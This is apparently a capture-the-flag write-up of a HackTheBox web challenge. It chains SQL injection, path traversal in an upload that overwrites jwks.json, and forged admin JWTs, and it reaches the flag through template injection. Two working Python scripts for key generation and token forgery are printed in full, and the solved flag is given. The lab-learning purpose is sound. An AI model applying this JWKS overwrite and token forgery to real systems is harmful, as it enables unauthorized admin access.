
![](https://cdn-images-1.medium.com/max/1000/1*a8vWGIkHz6mnvlmoNgc2iQ.png)

#### Challenge Scenario

---

Bobby and I had recently created a nice little webapp to hang out and chat with our buddies, but that devil ran off to some vacation for new year. He did leave a bot behind to keep an eye out though. Hope nothing happens!

check the website

![](https://cdn-images-1.medium.com/max/1000/1*UfRhGuKIhBaMBVTVnxt74w.png)

it seems like a chat application,but chat with ai

![](https://cdn-images-1.medium.com/max/1000/1*Dks15JVn8_1voSIVZArfjg.png)

![](https://cdn-images-1.medium.com/max/1000/1*FfjJH3JBEgLKbDLPChg2AQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*Srm3YGMPz6X14XItJAYc7g.png)

![](https://cdn-images-1.medium.com/max/1000/1*duAUAlssoX7_L7G7N9-w3Q.png)

check the zip file

![](https://cdn-images-1.medium.com/max/1000/1*NZagnIJT426EGyhIX1uJ9g.png)

we can find some important details

first is the /proflie

![](https://cdn-images-1.medium.com/max/1000/1*VVTIIDSn62Jnh0lxnruwHg.png)

![](https://cdn-images-1.medium.com/max/1000/1*c3hSQC7Alprz5kTDJ8bATA.png)

we can find sql inject vulnerable here 

so how to control the token

![](https://cdn-images-1.medium.com/max/1000/1*tQ_nJlMOXMv16tArYksWmQ.png)

wow, does it means we cant control 

![](https://cdn-images-1.medium.com/max/1000/1*WWu7erEwfj_qGh5qt1iorA.png)

oh ,it means we can change the token in the package to achieve the sql inject after we have a real account

![](https://cdn-images-1.medium.com/max/1000/1*n54X6THRJ3tbHrWZmjEhMQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*ASQ6csCWjf0bwEL_wruRyQ.png)

yes, the sql sentense worked

![](https://cdn-images-1.medium.com/max/1000/1*NYNn7ik0_QWMOfl9tBPXqw.png)

but how to use it 

we found a LFI at chat

![](https://cdn-images-1.medium.com/max/1000/1*XJHnBiMlSCJOf0S-AEzbKQ.png)

have a prof,we upload 1.txt and ../1.txt,it works

![](https://cdn-images-1.medium.com/max/1000/1*WUtdUOdnbU0ikOCff4IOOQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*tu9T5cXuxgIBm4vtR-_38A.png)

it will return 404,but it just becuase /app was set as cant read

lets move to next step

we can find the path to jwks.json

![](https://cdn-images-1.medium.com/max/1000/1*cU0uYjUkeeDcxgfcBYernA.png)

so we just need to upload a file as ../static/.well-known/jwks.json

so use this to make my secrets json

> import json  
> from jwcrypto import jwk  
> key = jwk.JWK.generate(kty=”RSA”, size=2048, alg=”RS256", use=”sig”)  
> key.kid = “forged-admin-key”  
> public_jwk = json.loads(key.export_public())  
> jwks = {  
>  “keys”: [public_jwk]  
> }  
> with open(“jwks.json”, “w”) as f:  
>  json.dump(jwks, f, indent=4)  
> private_jwk = json.loads(key.export_private())  
> with open(“private_key.json”, “w”) as f:  
>  json.dump(private_jwk, f, indent=4)

> print(“生成成功！”)  
> print(“- 请将 ‘jwks.json’ 上传覆盖服务器文件”)  
> print(“- 保留 ‘private_key.json’ 用于本地签发 Token”)

then ,use this to make my token

> import jwt  
> import time  
> from jwcrypto import jwk  
> with open(“private_key.json”, “r”) as f:  
>  key_data = jwk.JWK.from_json(f.read())  
> private_pem = key_data.export_to_pem(private_key=True, password=None)  
> payload = {  
>  “user_id”: “7728a52b-1b4b-4aae-bbf8–32f6bd605d98”,  
>  “username”: “bobby_2cb6814d1c47a0803392”,  
>  “role”: “admin”,  
>  “iat”: int(time.time()),  
>  “exp”: int(time.time()) + 3600 # 1小时后过期  
> }  
> headers = {  
>  “kid”: “forged-admin-key”,  
>  “alg”: “RS256”,  
>  “typ”: “JWT”  
> }  
> token = jwt.encode(payload, private_pem, algorithm=”RS256", headers=headers)  
> print(“\n你的伪造管理员 JWT 令牌:”)  
> print(token)

![](https://cdn-images-1.medium.com/max/1000/1*C5JBpBoTsP6MbV54EdFigQ.png)

upload

![](https://cdn-images-1.medium.com/max/1000/1*Z08_Qk-fJ7sE-okn7B2Xpw.png)

![](https://cdn-images-1.medium.com/max/1000/1*jdV6rhZm8kNRdMXODIT_TQ.png)

yep, we are the admin now 

here we have the third problem to use

SSTI

![](https://cdn-images-1.medium.com/max/1000/1*ujKd9Xmrmkyt5h-bbV281Q.png)

so use 

![](https://cdn-images-1.medium.com/max/1000/1*o-W_j3s_DX_9wneaXRIFzw.png)

it use chr() bypasses the filter, single quotes bypass double quote filtering

open(‘/flag.txt’).read()

use curl make request

we got it 

![](https://cdn-images-1.medium.com/max/1000/1*cT2BJ3NdduaBlFQwKkPUOA.png)

![](https://cdn-images-1.medium.com/max/1000/1*qBV_CM3lPdq5X67Mclmz2A.png)

![](https://cdn-images-1.medium.com/max/1000/1*_QYhWxJyk-aam7T2sR4HTw.png)

**_HTB{e2644b94e29cc3492e9e0e34ca6eb34f}_**